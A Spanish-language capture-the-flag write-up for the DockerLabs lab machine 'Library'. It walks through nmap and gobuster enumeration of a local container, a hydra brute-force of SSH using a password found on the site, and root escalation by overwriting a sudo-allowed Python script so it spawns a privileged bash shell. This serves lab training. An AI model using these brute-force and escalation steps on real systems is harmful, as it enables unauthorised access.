# Library
![library](https://github.com/TBrux/DOCKERLABS/assets/168732212/d36c54cb-c234-423e-ac6f-d3323a8a6cfd)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

```

Como tenemos abiertos los puertos 22 y 80 vamos a comprobar la versión y lanzar unos scripts básicos de reconocimiento para ver que información obtenemos.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos 22 (SSH) y 80 (HTTP)..
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOE+AMUTmmJFie8NgXoV0LWMWmHQU2yXAMVJnPC/JPzRYOstWvVS+YjLNy2mNK2aKFi/ubqYfwGq5IkKZgXTUEA=
|   256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKaYjuffpq2p5LshURmRdGCPjM1gO/+OI5UZ4l37IkRF
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
Como la versión de **ssh** no permiete la enumeracíon de puertos, y en el puerto 80 encontramos la página principal de **Aparche2** vamos a hacer fuzzing a la página y ver si encontramos alguna ruta interesante.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
```
```
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
Encontramos una página **index.php**, que si la visitamos encontramos lo que parece una contraseña.

![pass](https://github.com/TBrux/DOCKERLABS/assets/168732212/7b406527-b70f-43fe-b023-e103dbc53e5e)

## Explotación.

Con esta contraseña podemos probar a entrar por fuerza bruta por el puerto **ssh** (22).
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
```
```
❯ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-26 12:14:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```
Ya tenemos un usuario **carlos** y passsword **JIFGHDS87GYDFIGD**, por lo que nos conectamos por ssh.
```bash
❯ ssh carlos@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:Hvih5sjfx4Qwfp0rb0aWHkFvIxZbFo+cyOaoqbCHXSI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.5.0-kali3-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
carlos@fa0a812dce21:~$ 
```

## Escalada de privilegios.
Probamos a ver si encontramos algún archivo que podemos ejecutar con el usuario **carlos** pero con privilegios de **root**.
```bash
carlos@fa0a812dce21:~$ sudo -l
Matching Defaults entries for carlos on fa0a812dce21:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on fa0a812dce21:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```
```
carlos@fa0a812dce21:/opt$ ll
total 12
drwxr-xr-x 1 carlos root 4096 May 26 10:20 ./
drwxr-xr-x 1 root   root 4096 May 26 10:04 ../
-r-xr--r-- 1 carlos root  272 May  7 15:19 script.py
```
Como tenemos permisos de ese fichero podemos elimiar este fichero llamado **script.py** y crear otro para que nos lance una bash cuando lo ejecutemos, así como lo ejecutamos como **root**, ya tenemos control total.
```python
  GNU nano 7.2                                                                                                     script.py *                                                                                                             
import os

os.system('/bin/bash -p')
```
```bash
sudo -u root /usr/bin/python3 /opt/script.py 
```
```
carlos@fa0a812dce21:/opt$ sudo -u root /usr/bin/python3 /opt/script.py 
root@fa0a812dce21:/opt# whoami
root
```


